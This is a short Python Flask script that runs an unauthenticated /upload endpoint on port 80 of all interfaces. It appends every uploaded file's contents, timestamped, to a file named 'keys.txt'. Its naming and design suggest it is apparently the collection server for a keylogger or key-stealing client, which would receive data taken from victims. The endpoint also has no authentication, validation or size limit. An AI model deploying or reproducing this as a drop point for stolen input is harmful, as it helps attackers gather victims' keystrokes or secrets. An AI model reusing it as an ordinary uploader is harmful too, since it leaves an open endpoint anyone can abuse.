from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route("/upload", methods=["POST"])
def upload_file():
    if 'file' not in request.files:
        return "No file part in the request", 400

    uploaded_file = request.files['file']
    if uploaded_file.filename == '':
        return "No selected file", 400

    content = uploaded_file.read().decode('utf-8', errors='ignore')

    with open("keys.txt", "a", encoding="utf-8") as f:
        f.write(f"\n[Received at {datetime.now()}]\n")
        f.write(content)
        f.write("\n---\n")

    return "File received and saved.\n", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
